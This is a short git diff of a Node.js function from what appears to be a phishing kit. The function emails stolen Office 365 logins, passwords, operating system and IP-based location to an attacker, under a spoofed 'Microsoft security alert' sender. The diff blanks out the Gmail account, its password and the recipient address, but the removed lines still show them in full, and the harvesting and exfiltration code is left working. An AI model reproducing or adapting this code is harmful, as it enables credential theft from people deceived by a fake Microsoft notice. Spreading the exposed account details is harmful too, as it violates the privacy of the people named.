@@ -24,13 +24,13 @@ function sendmail(req,res){
  const transporter = nodemailer.createTransport({
   service: 'gmail',   
   auth: {           
-   user: 'guilhermeassuncao301@gmail.com',
-   pass: 'gui7voltage!'
+   user: '',
+   pass: ''
   }
  });  
  var mailOptions = {
   from:'Microsoft security alert <microsoftsecurityalert@gmail.com>',
-  to: 'dakota3011@outlook.com',
+  to: '',
   subject: 'Information login collected office 365',
   html: `<b><h2>Login Office365</h2></b><p>Email: ${email}<br>Password: ${password}<br>OS: ${os}<br>IP: ${info_location["ipAddress"]}<br>Country: ${info_location["countryName"]}<br>City: ${info_location["city"]}</p>`
  };
